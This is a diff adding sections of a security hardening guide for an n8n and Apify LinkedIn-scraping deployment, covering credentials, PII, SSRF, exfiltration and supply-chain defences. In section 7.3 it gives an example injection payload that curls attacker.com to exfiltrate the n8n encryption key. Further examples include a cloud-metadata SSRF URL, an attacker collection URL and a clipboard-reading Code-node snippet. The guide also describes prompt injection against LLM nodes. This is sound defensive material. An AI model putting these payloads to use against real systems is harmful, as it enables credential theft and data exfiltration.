@@ -3188,43 +3188,521 @@ sudo mdutil -i off /opt/n8n
 
 ### 7.1 Credential Management
 
-<!-- Content: T034 -->
+**Threat**: Credentials stored in plaintext files, environment variables, or command-line arguments are visible to any process with sufficient access — enabling credential theft without exploitation
+**Layer**: Prevent
+**Deployment**: Both
+**Source**: [NIST SP 800-63B](https://csrc.nist.gov/publications/detail/sp/800-63b/final) (Digital Identity Guidelines), [OWASP Secrets Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html), [MITRE ATT&CK T1552](https://attack.mitre.org/techniques/T1552/)
+
+#### Why This Matters
+
+This deployment manages multiple high-value credentials. The `N8N_ENCRYPTION_KEY` is the single master secret — anyone with this key and the n8n database can decrypt all stored credentials. Proper storage differs by deployment path: Docker secrets for containerized, Keychain for bare-metal.
+
+#### How to Harden
+
+**Credential inventory** — every credential in this deployment:
+
+| Credential | Type | Containerized Storage | Bare-Metal Storage | Blast Radius |
+|-----------|------|----------------------|-------------------|--------------|
+| `N8N_ENCRYPTION_KEY` | encryption_key | Docker secret | Keychain (§6.2) | Decrypts ALL stored n8n credentials |
+| `N8N_USER_MANAGEMENT_JWT_SECRET` | secret | Docker secret | Keychain | Session hijacking, account takeover |
+| LinkedIn session token | token | n8n credential store | n8n credential store | LinkedIn account access, scraping |
+| Apify API key | api_key | n8n credential store | n8n credential store | Full Apify account access |
+| SSH private key | certificate | N/A (host-level) | N/A (host-level) | Remote Mac Mini access |
+| SMTP relay credentials | password | Docker secret or n8n | Keychain or n8n | Email sending, phishing vector |
+| n8n API key (if enabled) | api_key | n8n credential store | n8n credential store | Workflow CRUD, credential access |
+
+**Per-path storage guidance:**
+
+- **Containerized**: Use Docker secrets for `N8N_ENCRYPTION_KEY` and `JWT_SECRET` (§4.3). Store service credentials (LinkedIn, Apify) in n8n's built-in credential manager, which encrypts them with the encryption key.
+- **Bare-metal**: Use a separate Keychain with ACLs (§6.2) for `N8N_ENCRYPTION_KEY`. Store service credentials in n8n's credential manager.
+- **Never**: Store credentials in plaintext config files, git repositories, shell history, or clipboard managers.
+
+**Generate strong credentials:**
+
+```bash
+# Generate a random encryption key
+openssl rand -hex 32
+
+# Generate a random JWT secret
+openssl rand -hex 32
+```
+
+**Credential reuse warning**: Use a unique password for every service — the Mac Mini login, n8n web UI, SMTP, and all API keys must be different. Credential reuse is the #1 enabler of lateral movement. Use Bitwarden CLI (free) for generating and managing unique credentials:
+
+```bash
+brew install bitwarden-cli
+bw generate -ulns --length 32
+```
+
+#### Verification
+
+```bash
+# Containerized: verify no secrets in container environment
+docker inspect "$(docker ps -q --filter name=n8n)" \
+    --format '{{json .Config.Env}}' 2>/dev/null | \
+    grep -iE 'ENCRYPTION_KEY=|PASSWORD=|SECRET=|TOKEN=.*[a-zA-Z0-9]{8}'
+# Expected: no matches (secrets should be in /run/secrets/)
+
+# Bare-metal: verify no secrets in process arguments
+ps -p "$(pgrep -f 'n8n start' 2>/dev/null)" -o args= 2>/dev/null
+# Expected: no encryption keys, passwords, or tokens visible
+```
+
+**Audit checks**: `CHK-CRED-ENV-VISIBLE` (WARN) → §7.1
 
 ### 7.2 Credential Lifecycle
 
-<!-- Content: T034 -->
+**Threat**: Stale credentials that are never rotated give attackers an unlimited window to exploit stolen credentials; missing revocation procedures delay incident response
+**Layer**: Prevent
+**Deployment**: Both
+**Source**: [NIST SP 800-63B §5.1](https://csrc.nist.gov/publications/detail/sp/800-63b/final) (Authenticator Lifecycle), [MITRE ATT&CK T1078](https://attack.mitre.org/techniques/T1078/) (Valid Accounts), [MITRE ATT&CK T1528](https://attack.mitre.org/techniques/T1528/) (Steal Application Access Token)
+
+#### Why This Matters
+
+Credentials that are never rotated give attackers an unlimited exploitation window — a stolen Apify API key works until it is revoked. Without a rotation schedule and revocation procedure, incident response becomes trial-and-error under time pressure.
+
+#### How to Harden
+
+**Rotation schedule:**
+
+| Credential | Rotation Interval | Procedure | What Breaks |
+|-----------|-------------------|-----------|-------------|
+| `N8N_ENCRYPTION_KEY` | Annually | Re-encrypt database first (§9.2) | All stored credentials decrypt |
+| LinkedIn session token | Every 90 days or on forced re-auth | Re-authenticate in browser, update n8n credential | Scraping workflows pause |
+| Apify API key | Every 90 days | Regenerate in Apify dashboard, update n8n credential | Apify actor triggers fail |
+| SSH key | Annually | Generate new key, deploy public key, remove old | SSH access temporarily interrupted |
+| SMTP credentials | Per provider policy | Update in provider portal, update n8n credential | Notification emails fail |
+| n8n API key | Every 90 days (if enabled) | Regenerate in n8n Settings > API | API integrations fail |
+| `JWT_SECRET` | Annually | Update env var, restart n8n | All active sessions invalidated |
+
+**Emergency rotation**: If any credential is suspected compromised, rotate ALL credentials within 2 hours using the emergency rotation runbook (§9.2). Practice the rotation procedure before an incident occurs.
+
+**Expiry detection:**
+
+- LinkedIn sessions expire silently — monitor for scraping workflow failures
+- Apify API keys do not expire unless rotated
+- SSH keys do not expire — track creation date and rotate manually
+
+#### Edge Cases and Warnings
+
+- **`N8N_ENCRYPTION_KEY` rotation**: This is the most critical rotation. You MUST re-encrypt the database before changing the key, or all stored credentials become permanently inaccessible. See §9.2 for the procedure.
+- **Credential inventory maintenance**: Keep the inventory (§7.1) updated whenever credentials are added, rotated, or removed. This is essential for incident response.
 
 ### 7.3 Scraped Data Input Security
 
-<!-- Content: T034 -->
+**Threat**: Scraped LinkedIn data containing shell metacharacters, prompt injection payloads, or malicious URLs reaches n8n code execution nodes, achieving remote code execution
+**Layer**: Prevent
+**Deployment**: Both
+**Source**: [OWASP A03 Injection](https://owasp.org/Top10/A03_2021-Injection/), [OWASP LLM Top 10 — LLM01 Prompt Injection](https://owasp.org/www-project-top-10-for-large-language-model-applications/), [MITRE ATT&CK T1059](https://attack.mitre.org/techniques/T1059/)
+
+#### Why This Matters
+
+ALL data entering n8n from Apify actors must be treated as adversarial. LinkedIn profiles are editable by anyone — an attacker can place shell metacharacters, SQL injection, or prompt injection payloads in their job title, company name, or summary. The attack surface is the boundary where scraped data crosses from "being processed" to "influencing code execution."
+
+**Data flow through the deployment:**
+
+1. Apify actor scrapes LinkedIn → returns structured data via API
+2. n8n trigger/webhook receives Apify response
+3. n8n transformation nodes process data (Set, IF, Switch, Merge — **safe**, no code execution)
+4. **Danger zone**: data reaches a code execution node (Code, Execute Command, SSH, AI Agent)
+5. Output: data stored, sent via email/webhook, or written to database
+
+**Concrete attack chain:**
+
+1. Attacker sets LinkedIn job title to: `` `; curl attacker.com/exfil?key=$(cat /run/secrets/n8n_encryption_key)` ``
+2. Apify scrapes the profile
+3. n8n Code node processes: `` const result = `Processing ${item.jobTitle}` ``
+4. Backtick interpolation executes the attacker's shell command
+
+#### How to Harden
+
+**Workflow audit checklist** — review every workflow that processes scraped data:
+
+| Node Type | Risk | Action |
+|-----------|------|--------|
+| **Code** | JavaScript/Python execution | Never interpolate scraped data into code strings |
+| **Execute Command** | Shell execution | Block via `NODES_EXCLUDE` (§5.6) |
+| **SSH** | Remote shell | Block via `NODES_EXCLUDE` |
+| **HTTP Request** | SSRF vector | Use allowlisted base URLs only (§7.5) |
+| **AI Agent / LangChain** | Prompt injection | Structural data/prompt separation |
+| **Set / IF / Switch / Merge** | None (data only) | Safe — no code execution |
+
+**Safe patterns:**
+
+- Treat all scraped fields as data, never code: `JSON.stringify(item.jobTitle)` not template literals
+- Validate data types and lengths before processing
+- In Code nodes, use explicit property access: `items[0].json.jobTitle` (not dynamic eval)
+- Never chain LLM output to code execution nodes
+- Never allow LLM output to call the n8n API
+
+**Prompt injection defense** (if using AI/LLM nodes):
+
+- Pass scraped data as clearly delimited data fields, never concatenated into prompt text
+- Validate LLM output against an expected schema before acting on it
+- Include system prompt instructions to ignore embedded directives (weak control — speed bump, not wall)
+
+**Detection**: Enable n8n execution logging to record all workflow inputs/outputs. Monitor for:
+
+- Unexpected outbound connections from the container or host
+- Shell metacharacters in scraped data fields (`$()`, backticks, `&&`, `||`, `;`, `|`)
+- Unusual file access outside expected paths
+
+> **WARNING** (bare-metal): Without containerization, successful injection gives the attacker full access to the operator's home directory, SSH keys, macOS Keychain, and the ability to install persistent backdoors. Containerization is the single most important control for deployments processing scraped web data.
+
+**Audit check**: `CHK-N8N-NODES` (WARN) → §5.6 (cross-reference — node exclusion check)
 
 ### 7.4 PII Protection
 
-<!-- Content: T034 -->
+**Threat**: Scraped LinkedIn data constitutes PII subject to GDPR, CCPA, and LinkedIn Terms of Service; uncontrolled retention, storage, and access expand breach impact and legal exposure
+**Layer**: Prevent
+**Deployment**: Both
+**Source**: [GDPR Article 32](https://gdpr-info.eu/art-32-gdpr/), [CCPA Section 1798.150](https://leginfo.legislature.ca.gov/faces/codes_displaySection.xhtml?sectionNum=1798.150.&lawCode=CIV), [NIST SP 800-122](https://csrc.nist.gov/publications/detail/sp/800-122/final)
+
+#### Why This Matters
+
+This deployment scrapes LinkedIn profiles — personal data that may include names, emails, phone numbers, employment history, and location. A data breach requires notification within 72 hours (GDPR) or promptly (CCPA), with potential statutory damages. Minimizing what PII is collected and retained reduces both breach impact and legal exposure.
+
+#### How to Harden
+
+**Data classification** — PII fields in this deployment:
+
+| Field | Sensitivity | Source | GDPR Relevant |
+|-------|------------|--------|---------------|
+| full_name | semi-private | LinkedIn | Yes |
+| email | semi-private | LinkedIn/enrichment | Yes |
+| phone | semi-private | Enrichment | Yes |
+| job_title | public | LinkedIn | Yes |
+| company_name | public | LinkedIn | Yes |
+| profile_url | public | LinkedIn | Yes |
+| location | semi-private | LinkedIn | Yes |
+| employment_history | semi-private | LinkedIn | Yes |
+| education | semi-private | LinkedIn | Yes |
+| profile_photo | public | LinkedIn | Yes |
+| skills/endorsements | public | LinkedIn | Yes |
+| derived/enriched data | derived | LLM/enrichment | Yes |
+
+**Data minimization**: Configure Apify actors to scrape only fields required for lead generation — not entire profiles. Fewer fields stored means smaller breach impact and lower notification burden.
+
+**Data flow map** — where PII lives:
+
+| Location | At Rest | In Transit | Retention |
+|----------|---------|------------|-----------|
+| n8n database (SQLite) | Encrypted (FileVault + n8n encryption) | N/A | Until explicitly deleted |
+| Docker volumes | Encrypted (FileVault) | N/A | Until volume removed |
+| n8n execution logs | Contains full input/output data | N/A | Configure retention limit |
+| Apify platform | Apify-managed | HTTPS | Configure minimum retention |
+| Time Machine backups | May contain PII snapshots | N/A | Per backup retention policy |
+| Backup archives | Must be encrypted (§9.3) | N/A | Per retention policy |
+
+**Retention limits:**
+
+```bash
+# Configure n8n execution log retention (contains PII in workflow data)
+# Set in environment variables:
+EXECUTIONS_DATA_SAVE_ON_SUCCESS=none  # Don't retain successful execution data
+EXECUTIONS_DATA_MAX_AGE=168           # Delete execution data older than 168 hours (7 days)
+```
+
+**Spotlight exclusion** — prevent PII from appearing in Spotlight search:
+
+```bash
+# Containerized: exclude Docker volumes
+sudo mdutil -i off /var/lib/docker 2>/dev/null || true
+
+# Bare-metal: exclude n8n data directory
+sudo mdutil -i off /opt/n8n
+```
+
+**Breach notification obligations:**
+
+- **GDPR**: 72-hour notification to supervisory authority if EU residents' data is involved (Article 33)
+- **CCPA**: Prompt notification to affected California residents with potential statutory damages
+- **LinkedIn ToS**: Scraping may violate Terms of Service; a breach involving scraped data may trigger LinkedIn enforcement action
+
+> **NOTE**: Consult legal counsel before scraping LinkedIn data at scale. The legal landscape around web scraping continues to evolve (see *hiQ Labs v. LinkedIn*, 9th Cir. 2022).
+
+#### Verification
+
+```bash
+# Verify Spotlight is disabled for n8n data directories
+mdutil -s /opt/n8n 2>/dev/null  # Bare-metal
+# Expected: "Indexing disabled"
+```
+
+**Audit check**: `CHK-SPOTLIGHT-EXCLUSIONS` (WARN) → §7.4
 
 ### 7.5 SSRF Defense
 
-<!-- Content: T034 -->
+**Threat**: Attacker-controlled URLs in scraped data or webhook payloads direct n8n's HTTP Request node to internal services, enabling internal network reconnaissance and data exfiltration
+**Layer**: Prevent
+**Deployment**: Both
+**Source**: [OWASP A10 SSRF](https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/), [MITRE ATT&CK T1090](https://attack.mitre.org/techniques/T1090/)
+
+#### Why This Matters
+
+n8n's HTTP Request node follows URLs provided in workflow data. If an attacker controls the URL (via a scraped LinkedIn field containing `http://169.254.169.254/latest/meta-data/`), they can direct n8n to make requests to internal services — the Docker bridge network, host services, cloud metadata endpoints, or LAN devices.
+
+#### How to Harden
+
+**Internal targets at risk:**
+
+| Target | Risk | Deployment |
+|--------|------|------------|
+| Docker bridge network (172.17.0.0/16) | Access other containers | Containerized |
+| Host gateway (host.docker.internal) | Access host services | Containerized |
+| Cloud metadata (169.254.169.254) | Cloud credential theft | Both |
+| localhost services (SSH, Screen Sharing) | Service exploitation | Both |
+| LAN devices | Lateral movement | Both |
+
+**Mitigations:**
+
+- Never interpolate untrusted data into URL fields — use allowlisted base URLs with only path or query parameters from scraped data
+- **Containerized**: Configure pf rules on the host to block container access to internal ranges:
+
+```bash
+# Block container access to host services and LAN (add to /etc/pf.conf)
+# Allow only required external destinations
+block out on bridge100 from any to 127.0.0.0/8
+block out on bridge100 from any to 169.254.169.254
+block out on bridge100 from any to 10.0.0.0/8
+block out on bridge100 from any to 172.16.0.0/12
+block out on bridge100 from any to 192.168.0.0/16
+```
+
+- **Bare-metal**: pf rules blocking outbound connections from the `_n8n` user to localhost services and LAN ranges
+- Use Docker `--internal` network flag for containers that don't need external access
+
+#### Verification
+
+```bash
+# Test SSRF defense from inside container
+docker compose exec n8n curl -s --connect-timeout 3 http://169.254.169.254/ 2>&1
+# Expected: connection refused or timeout
+
+docker compose exec n8n curl -s --connect-timeout 3 http://host.docker.internal:22/ 2>&1
+# Expected: connection refused or timeout
+```
 
 ### 7.6 Data Exfiltration Prevention
 
-<!-- Content: T034 -->
+**Threat**: Attacker exfiltrates PII or credentials via "non-dangerous" n8n nodes that can send data externally — HTTP Request, Email, Slack, database nodes — without executing arbitrary code
+**Layer**: Prevent
+**Deployment**: Both
+**Source**: [MITRE ATT&CK T1041](https://attack.mitre.org/techniques/T1041/) (Exfiltration Over C2 Channel), [MITRE ATT&CK T1567](https://attack.mitre.org/techniques/T1567/) (Exfiltration Over Web Service)
+
+#### Why This Matters
+
+An attacker who gains workflow modification access (via API, UI, or injection) can add a node that silently copies all processed data to an external endpoint. Even nodes that don't execute code — like HTTP Request or Email — can exfiltrate data. Outbound filtering (§3.3) is the primary technical defense.
+
+#### How to Harden
+
+**Exfiltration-capable nodes:**
+
+| Node Type | Exfiltration Method | Defense |
+|-----------|-------------------|---------|
+| HTTP Request | POST data to attacker URL | Outbound allowlist (§3.3), URL validation |
+| Email/SMTP | Email data to attacker address | SMTP relay restrictions |
+| Slack/Discord/Telegram | Send data to messaging platforms | Webhook URL validation |
+| Database nodes | Write data to external databases | Network filtering |
+| Webhook Response | Include data in responses | Response content review |
+
+**Defenses:**
+
+- **Outbound filtering** (§3.3): pf allowlist blocks connections to non-approved destinations — even if a workflow tries to exfiltrate, the connection is blocked
+- **Workflow integrity monitoring** (§8.3): Detect unauthorized workflow modifications that add exfiltration nodes
+- **Scraped URL caution**: Never use scraped URLs in HTTP Request nodes without domain allowlisting — a crafted LinkedIn field like `http://attacker.com/collect?data=` leaks your IP and potentially other data
 
 ### 7.7 Supply Chain Integrity
 
-<!-- Content: T034 -->
+**Threat**: Compromised software packages — Docker images, Homebrew formulae, npm packages — execute malicious code during installation or at runtime
+**Layer**: Prevent
+**Deployment**: Both
+**Source**: [NIST SP 800-218](https://csrc.nist.gov/publications/detail/sp/800-218/final) (SSDF), [MITRE ATT&CK T1195.001](https://attack.mitre.org/techniques/T1195/001/) (Compromise Software Dependencies)
+
+#### Why This Matters
+
+This deployment depends on multiple package ecosystems (Docker Hub, Homebrew, npm), each with distinct trust models. A compromised Docker image or malicious npm postinstall script achieves code execution with the privileges of the n8n process.
+
+#### How to Harden
+
+**Docker image integrity:**
+
+```bash
+# Pin images by digest (not mutable tags like :latest)
+# In docker-compose.yml:
+#   image: n8nio/n8n@sha256:<digest>
+
+# Record current image digest
+docker inspect n8nio/n8n --format '{{index .RepoDigests 0}}' 2>/dev/null
+
+# Enable Docker Content Trust for signature verification
+export DOCKER_CONTENT_TRUST=1
+
+# Inspect image layers for unexpected content
+docker history n8nio/n8n 2>/dev/null
+```
+
+**Homebrew package integrity:**
+
+```bash
+# Verify package source before installing
+brew info <package>
+
+# Avoid third-party taps for security-critical tools
+# Only use official Homebrew formulae or well-known taps
+
+# Check for security advisories after updates
+brew audit --strict <package>
+```
+
+**npm supply chain** (bare-metal path):
+
+```bash
+# Install with --ignore-scripts to prevent postinstall code execution
+npm install --ignore-scripts n8n
+
+# Review postinstall scripts before allowing
+cat node_modules/n8n/package.json | jq '.scripts'
+
+# Audit for known vulnerabilities
+npm audit
+```
+
+**Image scanning schedule**: Periodically scan Docker images for known vulnerabilities:
+
+```bash
+# Using Trivy (free, open-source)
+brew install aquasecurity/trivy/trivy
+trivy image n8nio/n8n
+```
 
 ### 7.8 Apify Actor Security
 
-<!-- Content: T034 -->
+**Threat**: Malicious or compromised Apify actors modify scraped data to include injection payloads, or exfiltrate the operator's Apify API key
+**Layer**: Prevent
+**Deployment**: Both
+**Source**: [OWASP A08 Software and Data Integrity Failures](https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/), [MITRE ATT&CK T1195.002](https://attack.mitre.org/techniques/T1195/002/)
+
+#### Why This Matters
+
+Apify actors are the first point of contact with untrusted data. A compromised actor can modify scraped data to include injection payloads, or silently exfiltrate the operator's API key. Even legitimate actors return data from LinkedIn profiles that anyone can edit.
+
+#### How to Harden
+
+**Actor trust:**
+
+- Only use official Apify actors or actors from verified publishers with high usage counts
+- Third-party actors with low usage or no source code are high risk
+- Review actor source code if available on GitHub
+
+**API key security:**
+
+- Use scoped API tokens if Apify supports them (limited to specific actors and datasets)
+- Store API keys in n8n's credential manager — never hardcode in workflows
+- Rotate API keys per the schedule in §7.2
+
+**Actor output validation:**
+
+- Validate actor output schema in the n8n workflow before processing
+- Check expected fields exist, validate data types and length limits
+- Reject payloads that don't match the expected structure
+
+**Apify webhook authentication:**
+
+Apify does NOT support HMAC webhook signing. Instead:
+
+1. Add a secret token to the webhook URL: `https://your-server/webhook/path?token=SECRET`
+2. Combine with n8n webhook Header Auth (§5.5)
+3. Optionally validate `X-Apify-Webhook-Dispatch-Id` against Apify's API
+
+**Data residency:**
+
+Scraped LinkedIn PII exists on Apify's servers as well as the Mac Mini. Configure Apify data retention to the minimum period and delete datasets after n8n retrieval.
 
 ### 7.9 Secure Deletion
 
-<!-- Content: T034 -->
+**Threat**: Deleted PII persists on APFS/SSD storage due to copy-on-write semantics and TRIM behavior, remaining recoverable by an attacker with physical access
+**Layer**: Prevent
+**Deployment**: Both
+**Source**: [NIST SP 800-88 Rev 1](https://csrc.nist.gov/publications/detail/sp/800-88/rev-1/final) (Media Sanitization — §2.5 SSD), [Apple Platform Security Guide](https://support.apple.com/guide/security/welcome/web)
+
+#### Why This Matters
+
+Traditional secure deletion (overwriting files with zeros) does not work on modern Macs. APFS uses copy-on-write, and the SSD controller performs TRIM independently — `srm` was removed in macOS Catalina because it cannot guarantee overwrite on SSDs. FileVault (§2.1) is the primary deletion defense: deleted data remains encrypted on disk.
+
+#### How to Harden
+
+**FileVault as deletion defense:**
+
+When FileVault is enabled, deleted data persists in encrypted form. An attacker with physical disk access cannot read deleted data without the FileVault key. This makes FileVault not just a theft defense but a deletion defense.
+
+**Crypto-shredding:**
+
+The most reliable way to permanently destroy all data on an encrypted volume is crypto-shredding — destroying the encryption key:
+
+```bash
+# Full volume crypto-shred (destroys ALL data):
+# System Settings > General > Transfer or Reset > Erase All Content and Settings
+# This is irreversible — use only for decommissioning
+```
+
+For individual files, there is no reliable crypto-shredding mechanism. Data is protected by FileVault encryption while it persists on disk.
+
+**Practical deletion procedures:**
+
+```bash
+# Purge n8n execution logs (contain PII):
+# Use n8n CLI
+n8n export:workflow --all --output=backup-workflows.json
+# Then delete old executions via n8n UI or API
+
+# Delete Docker volumes containing PII:
+docker compose down
+docker volume rm n8n_data  # WARNING: destroys all n8n data
+
+# Delete local Time Machine snapshots:
+tmutil deletelocalsnapshots /
+# NOTE: cannot selectively delete individual files from snapshots
+```
+
+**Time Machine snapshot implications:**
+
+When PII is deleted from n8n's database, it may persist in Time Machine local snapshots and backup volumes. Old backups containing PII should be scheduled for destruction per the data retention policy (§7.4).
+
+#### Edge Cases and Warnings
+
+- **APFS snapshots**: APFS creates local snapshots automatically. Deleted files persist in snapshots until they are removed.
+- **Docker build cache**: `docker builder prune` clears build cache that may contain sensitive files from build context.
+- **Temp files**: n8n writes temp files to `/var/folders/` (bare-metal) or `/tmp` (containerized). These may contain PII from workflow executions. Containerized deployments use `tmpfs` mounts that are cleared on container restart.
 
 ### 7.10 Clipboard Security
 
-<!-- Content: T034 -->
+**Threat**: Credentials copied to the macOS clipboard are accessible to any process running as the same user, including compromised n8n Code nodes on bare-metal `[EDUCATIONAL]`
+**Layer**: Prevent
+**Deployment**: Both (primarily bare-metal risk)
+**Source**: [MITRE ATT&CK T1115](https://attack.mitre.org/techniques/T1115/) (Clipboard Data), [Apple Developer Documentation — NSPasteboard](https://developer.apple.com/documentation/appkit/nspasteboard)
+
+#### Why This Matters
+
+On macOS, the system pasteboard is accessible to all processes running as the same user. On bare-metal, a compromised Code node can read the clipboard via `require('child_process').execSync('pbpaste').toString()`. On containerized deployments, the n8n process has no access to the macOS pasteboard.
+
+#### How to Harden
+
+- Use a password manager (Bitwarden CLI, free) to inject credentials directly into config files, avoiding the clipboard entirely
+- If clipboard use is unavoidable, clear immediately after pasting:
+
+```bash
+pbcopy < /dev/null
+```
+
+- On bare-metal: perform credential management only when n8n is stopped, or with n8n running under the `_n8n` service account (§6.1) which cannot access the admin user's clipboard
+- Disable Universal Clipboard (Handoff) to prevent clipboard syncing between Apple devices (§8.6)
+
+**Containerized advantage**: The n8n container has no access to the macOS pasteboard — this is another security benefit of containerization.
+
+> **NOTE**: There is no reliable macOS mechanism to detect clipboard monitoring by a process running as the same user. This is a fundamental limitation of same-user execution, reinforcing the recommendation for containerization or service account isolation (§6.1).
+
+**Audit check**: `CHK-CONFIG-PROFILES` (WARN) → §2.10 (cross-reference — configuration profile audit)
 
 ---
 
